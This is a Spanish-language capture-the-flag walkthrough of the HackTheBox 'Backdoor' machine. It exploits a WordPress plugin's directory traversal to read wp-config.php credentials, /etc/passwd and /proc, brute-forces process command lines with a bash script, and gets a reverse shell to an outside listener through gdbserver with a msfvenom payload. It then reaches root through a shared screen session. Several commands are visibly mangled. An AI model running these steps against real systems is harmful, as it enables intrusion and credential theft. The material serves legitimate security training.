# Máquina "Backdoor" de HackTheBox

Caracteristicas:

- Linux 
- Fácil 
- PHP
- Wordpress
- plugin
- Backdoor
- Easy
- Internal
- Penetration Tester Level 1
- Directory Traversal
- A06:2021-Vulnerable And Outdated Components
- Public Vulnerabilities
- Remote Code Execution
- WordPress Local File Inclusion Vulnerability (LFI) LFI to RCE (Abusing /proc/PID/cmdline)
- Gdbserver RCE Vulnerability Abusing Screen (Privilege Escalation) [Session synchronization]

Util en:

- OSCP 
- eWPT 
- OSWE 
- eWPTXv2

        Ip 10.10.11.125

- nmap -p-  --sS --min-rate 5000 --open -vvv -n -Pn 10.10.11.125 -oG all ports

    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    1337/tcp open  waste

- nmap -p 22,80,1337 -sCV -oA scans/nmap-tcpscripts 10.10.11.125


    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-generator: WordPress 5.8.1
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Backdoor &#8211; Real-Life
    |_https-redirect: ERROR: Script execution failed (use -d to debug)
    1337/tcp open  waste?
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

- whatweb 10.10.11.125

es un wordpress vamos a la pagina web probamos rutas por defecto y vemos que esta habilitado el wp-login.php
luego lanzamos 

- searchsploit wordpress 

buscamos user enumeration

- searchsploit -x php/webapps/41497.php

y vemos que dentro hay una ruta

    $payload="wp-json/wp/v2/users/";

asi que lanzamos con curl

- curl -s -X GET "http://10.10.11.125/wp-json/wp/v2/users/"

y deberia devolvernos un archivo .json pero no es asi, seguimos revisando la maquina y hacemos click en home
nos  muestra una pagina de error pero en el url se ve el host asi que agregamos la maquina al etc hosts

- sudo  echo   "10.129.96.68 backdoor.htb"  |   sudo  tee  -a /etc/hosts 


continuamos enumerando wordpress esta vez lanzaremos wpscan

- wpscan -e ap,t,tt,u --url http://backdoor.htb --api-token $WPSCAN_API

XMLRPC está habilitado

[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

 Vale la pena tenerlo en cuenta si quiero intentar aplicar fuerza bruta a los créditos de una cuenta o tener acceso a una cuenta sin acceso a la GUI.

 Hay varios CVE en el código de WordPress que se mencionan. Muchos no son interesantes (expired root cert, prototype pollution, incluso XSS
 (al menos no en este momento)).  Hay dos inyecciones de SQL (CVE-2022-21661 y CVE-2022-21664), pero no encontramos detalles de ella.
 no encontro plugins 
 
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.

Vale la pena comenzar en segundo plano un escaneo más agresivo para intentar aplicar fuerza bruta a los complementos, lo cual haré con 
--plugins-detection aggressive. Esto tarda mucho mas en completarce, pero encontramos.

- wpscan -e ap --plugins-detection aggressive --url http://backdoor.htb --api-token $WPSCAN_API

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:31:27 <====================================================================
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:                                          

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |                       
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |                      
 | [!] 1 vulnerability identified:
 |                      
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5     
 |     References:        
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.
[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt

el directorio en Ebook Download tambien el directorio /wp-content/plugins/ en Backdoor tiene la lista de directorios habilitada. Ese no es el caso predeterminado 
y WordPress normalmente pone un espacio vacío. index.php en este directorio para evitar este tipo de fuga de datos. Pero es el caso aquí, lo que 
significa que no es necesaria la fuerza bruta.

![Texto alternativo](/secciones/posts/imagenes/backdoor/pageplug1.webp)

Los enlaces de wpscan no proporciona POC pero una busqueda en google para recorrer el directorio de descargas de libros electrónicos encuentra
https://www.exploit-db.com/exploits/39575 esta publicación . Muestra que la versión se puede divulgar con 
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt (que es a lo que se hace referencia en el wpscanresultados), 
y que el POC debe visitar /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php. 
Con solo mirar el POC, parece que el ebookdownloadurlacepta una ruta local que probablemente no era la que pretendía el autor. 

Verificaré manualmente la versión solo para verificar: 

- curl http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt

    === Plugin Name ===                               
    Contributors: zedna                                                 
    Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=3ZVGZTC7ZPCH2&lc=CZ&item_name=Zedna%20Brickick%20Website&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
    Tags: ebook, file, download                                         
    Requires at least: 3.0.4         
    Tested up to: 4.4                             
    Stable tag: 1.1 


La "etiqueta estable" de 1.1 muestra una versión vulnerable. Soy capaz de leer el wp-config.phparchivo tal como sugiere POC, incluida la información
de conexión de la base de datos: 

- curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php

../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
/**
 * The base configuration for WordPress
...[snip]...
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

y la ruta que podemos explotar es

- /wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php 

en ves de wp-config hacemos 

- /etc/passwd

o por consola

- curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd"

grepeamos con sh

- curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd" | grep "sh$"

y podemos ver que nos devuelve al usuario user que tiene el directorio /home/user, asi que buscamos dentro de la ruta algun archivo ssh

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/home/user/.ssh/id_rsa"

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/home/user/.ssh/id_rsa.pub"

para buscar claves autorizadas.

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/home/user/.ssh/authorized_key"

para buscar puertos abiertos.

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/net/tcp"

nos devuelve algo tipo.

0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000

habrimos una consola python3 en una ventana aparte y agregando 0x0035 que es el puerto en exadecimal

vemos los puertos

>>> 0x0035
53
>>> 0x0016
22
>>> 0x0539
1337
>>> 0x8124
33060
>>> 0x0CEA 
3306
>>> 0xBC5E
48222
>>> 0xBD32
48434
>>> 0xBC7C
48252
>>> 0xE6EA
59114
>>> 0x8EDE
36574
>>> 0xBC4A 
48202
>>> 0xB2FC
45820

ahora para saber si estamos dentro de un contenedor.

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/net/fib_trie"

y no hay otras ip ni nada por el estilo asi que si es la victima real.
revisamos nuevamente el wp-config.php para que detecte codigo php (-l php)

- wp-config.php | bat -l php 

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php" | bat -l php

y podemos ver credenciales 

  26   │ define( 'DB_USER', 'wordpressuser' );
  27   │ 
  28   │ /** MySQL database password */
  29   │ define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

asi que ahora que ya intentamos mucho, podemos listar archivos pero no tenemos gran alcance, asi que intentaremos log poisoning

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../var/log/auth.log"

vemos los logs de apache

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../var/log/apache2/acces.log"

y no obtenemos nada asi que intentamos con las rutas /proc/net/tcp o /proc/net/arp, hay algunas rutas mas que nos servirian en proc
podemos buscar por shetstat

- find /proc -name \ *stat

empezamos a buscar por proc ( /proc), algo que tenga la palabra stat (-name \ *stat)

- find /proc -name \ * stat | less

revisamos en nuestro sistema /proc/stat o /proc/schedstat y esto nos podria listar algunos procesos corriendo en nuestro systema
asi que probamos con:

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/schedstat"

- sudo curl -s -X GET "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/stat"

y no vemos mucho asi que ahora buscamos por debug

- find /proc -name \ * debug \ * | less

/proc/sys/debug
/proc/sys/dev/cdrom/debug
/proc/scsi/sg/debug
/proc/dynamic_debug

y nos da esas 4 rutas que lanzaremos como vimos recientemente mientras, seguimos reviando en proc y hay muchos directorios con numeros
asi que vamos a

- ls /proc/100

y dentro hay un archivo cmdline, le hacemos un cat y esta vacio, el cmdline lo vemos en todos lo identificadores que pillamos
También está el selfcarpeta, que es un enlace simbólico al pid del proceso actual. Nuevamente, desde mi VM:

- ls -l /proc/self
lrwxrwxrwx 1 root root 0 Apr 18 21:38 /proc/self -> 85664

En cada carpeta numerada, el archivo cmdline tiene el usuario de la línea de comando para ejecutar el proceso: 

- cat /proc/self/cmdline
cat/proc/self/cmdline

- cat /proc/self/cmdline | xxd
00000000: 6361 7400 2f70 726f 632f 7365 6c66 2f63  cat./proc/self/c
00000010: 6d64 6c69 6e65 00                        mdline.

en resumen, en cuanto a procesos que corren en el systema con el archivo cmdline podemos llegar a tratar de ver que fue lo que invoco ese proceso

- curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- | xxd

Parece imprimir el parámetro dado tres veces y luego, sin interrupción, los resultados, que incluyen \ x00donde quisiera espacios. 
Luego termina en < script> window.close() < /script>. 

Puedo usar tr para reemplazar los valores nulos con espacios en blanco, y cut para eliminar el principio y el final: 

- curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr ' \ 000' ' ' | cut -c115- | rev | cut -c32- | rev
/usr/sbin/apache2 -k start

se descompone como:

    tr '\ 000' ' '- reemplazar nulos con espacios
    cut -c115-comience en el carácter 115 e imprima el resto. Notaré que 115 es tres veces la longitud del parámetro más 1.
    rev | cut -c32- | rev- invertir la cadena, comenzar con 32 caracteres y luego invertir nuevamente, eliminando efectivamente los últimos 31 caracteres.

Este recorrido también funciona con caminos absolutos, por lo que ebookdownloadurl=/proc/self/cmdline. 
Puedo crear un script Bash rápido a partir de esto para recorrer una variedad de pids e intentar encontrar procesos: 
creamos el archiv ./brute_processes.sh  

#!/bin/bash

    for i in $(seq 1 50000); do

        path="/proc/$ {i}/cmdline"
        skip_start=$(( 3 * $ {#path} + 1))
        skip_end=32

        res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=$ {path}ne -o- | tr ' \ 000' ' ')
        output=$(echo $res | cut -c $ {skip_start}- | rev | cut -c $ {skip_end}- | rev)
        if [[ -n "$output" ]]; then
            echo "$ {i}: $ {output}"
        fi

    done

esto hace lo que mostré arriba, capturando los resultados con nulos reemplazados en res, luego cortando el inicio y el final y guardando 
como output y finalmente imprimiendo el pid y la línea de comando si está allí. 
El script borra los primeros 1000 procesos en aproximadamente un minuto, lo que es suficiente para detectar el PID 851: 

./brute_processes.sh  

    1: /sbin/init auto automatic-ubiquity noprompt 
    486: /lib/systemd/systemd-journald 
    512: /lib/systemd/systemd-udevd 
    529: /lib/systemd/systemd-networkd 
    ...[snip]...
    826: /usr/sbin/cron -f 
    829: /usr/sbin/CRON -f 
    830: /usr/sbin/CRON -f 
    851: /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done 
    853: /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \ ; done 
    865: /usr/sbin/atd -f 
    867: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
    887: /usr/sbin/apache2 -k start 
    898: /usr/lib/accountsservice/accounts-daemon 

Este proceso es:

    /bin/sh -c while true;
        do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; 
    done

Está corriendo gdbservecomo usuario en un bucle en el puerto 1337.
Hacktricks tiene una página sobre explotación gdbserver. Sospecho que al menos la primera técnica se probó en Backdoor 
(dado el uso del puerto 1337 y la ubicación de /home/user). Esta técnica consiste en crear un elf y luego cargarlo en el depurador remoto y ejecutarlo allí. 

Crearé una carga útil de shell inverso simple con msfvenom: 

    msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf
    [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 106 bytes
    Final size of elf file: 226 bytes
    Saved as: rev.elf

A continuación, comenzaré a depurarlo localmente: 

    gdb -q rev.elf 
    Reading symbols from rev.elf...
    (No debugging symbols found in rev.elf)
    (gdb)

Ahora conéctese al servidor remoto:

    (gdb) target extended-remote 10.10.11.125:1337
    Remote debugging using 10.10.11.125:1337
    Reading /lib64/ld-linux-x86-64.so.2 from remote target...
    warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
    Reading /lib64/ld-linux-x86-64.so.2 from remote target...
    Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
    Reading /lib64/ld-2.31.so from remote target...
    Reading /lib64/.debug/ld-2.31.so from remote target...
    Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
    Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
    Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
    (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
    0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2

Con esa conexión puedo subir el binario.

    (gdb) remote put rev.elf /dev/shm/rev
    Successfully sent file "rev.elf".

Ahora sólo necesito configurar el objetivo de depuración remota para ese archivo y ejecutarlo.

    (gdb) set remote exec-file /dev/shm/rev
    (gdb) run
    The program being debugged has been started already.
    Start it from the beginning? (y or n) y
    Starting program:  
    Reading /dev/shm/rev from remote target...
    Reading /dev/shm/rev from remote target...
    Reading symbols from target:/dev/shm/rev...
    (No debugging symbols found in target:/dev/shm/rev)
    [Detaching after fork from child process 33603]
    [Inferior 1 (process 33592) exited normally]

cuando termine deberiamos ttener coneccion en nuestra nc 

- nc -lnvp 443

    Listening on 0.0.0.0 443
    Connection received on 10.10.11.125 46586
    id
    uid=1000(user) gid=1000(user) groups=1000(user)

configuramos la shell:

- script /dev/null -c bash
- ctrl + z
- stty raw -echo: fg
- reset xterm
- export TERM=xterm
- uname -a

una ves dentro buscamos y vemos la flag de user sin problemas

La forma más sencilla de explotar esto es utilizando Metasploit.

## Escalamiento de privilegios:

Mirando los procesos anteriores, salta a la vista otro. Desde un caparazón, es más fácil ver: 

user@Backdoor:/home/user$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root         853  0.0  0.0   2608  1828 ?        Ss   16:43   0:05 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \ ; done
...[snip]...

algo esta corriendo screencomo raíz (en un bucle) como raíz.

/bin/sh -c while true;
    do sleep 1;
    find /var/run/screen/S-root/ -empty -exec screen -dmS root \ ;
done

screenes un multiplexor de terminal, que permite a un usuario abrir múltiples ventanas desde una sesión y mantenerlas funcionando incluso cuando 
el usuario no está presente o conectado (desaparecerán al reiniciar). 

En general, no es posible iniciar sesión en las sesiones de pantalla de otros usuarios. Sin embargo, hay configuraciones que lo permiten y es lo que se vera
a continuacion, debe configurarse de una manera muy específica.

veamos cómo screen está siendo invoked. Hay un cron ejecutándose find /var/run/screen/S-root/ -empty -exec screen -dmS root ;\. Cuando se crea una sesión, 
screencrea una carpeta en /var/run/screen/S-[username]/[sesison id].[session name]. El -emptyla bandera dice findpara devolver solo directorios o archivos vacíos. 
Entonces solo devolverá algo si eso S-root La carpeta está vacía, lo que significa que no hay sesión. Si ese es el caso (no hay screensesión en S-root), 
se ejecutará screen para empezar uno. 

Corre screencon tres argumentos, y la página de manual (https://linux.die.net/man/1/screen) muestra:

    -D -m(que también cubre -dm) - inicia la pantalla en “modo separado” y no bifurca un nuevo proceso. Si la sesión finaliza, también sale.
    -S root- nombra la sesión, en este caso, "root"

esto no es suficiente para que otro usuario intente conectarse a la sesión, https://unix.stackexchange.com/a/163878/369627 aqui podemos ver 
habla sobre cómo configurar screen en modo multiusuario. Una vez dentro de la sesión, el usuario necesita multiuser on y agregue el usuario 
que puede conectarse a una lista de control de acceso. Como root, puedo ver que esto se hace en /root/.screenrc (que se ejecuta cada vez screenempieza): 

    multiuser on                                                                    
    acladd user                                                                     
    shell -/bin/bash

También señala en esa publicación que screendebe ser SUID para que esto funcione
screenestá configurado exactamente de esta manera, puedo explotarlo de la siguiente manera. 

user@Backdoor:/home/user$ screen -ls
No Sockets found in /run/screen/S-user.

El proceso se está ejecutando como root, así que intentaré decírselo. screen dentro S-root. Añadiendo root/hasta el final del comando funciona: 

    user@Backdoor:/home/user$ screen -ls S-root/
    Cannot identify account 'S-root'.
    user@Backdoor:/home/user$ screen -ls root/
    There is a suitable screen on:
            947.root        (04/20/22 16:43:20)     (Multi, detached)
    1 Socket in /run/screen/S-root.

    Me conectaré a esa sesión usando -xy el [user]/[session id]: 

    user@Backdoor:/home/user$ screen -x root/37344              
    Please set a terminal type.

Se queja de que falta un tipo de terminal. Normalmente se establece en una variable de entorno. Agregaré eso al frente del comando 
y al ejecutar TERM=screen screen -x root/37344, me dejan caer en un screensesión como root: 

-  TERM=screen -x root/37344

somos root buscamos la flag y terminada.

Algunos de los writeups en esta página, pueden tener contenido de otras páginas o tener muy pocas imágenes, esto 
debido a que en algunas de las máquinas que realice, no tome los apuntes o no tome capturas de pantalla, así que he decidido buscar varios writeups
y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí, también si encuentra faltas de ortografía 
o cualquier error, Puedes contactarme a mi correo.

lerioxirit@proton.me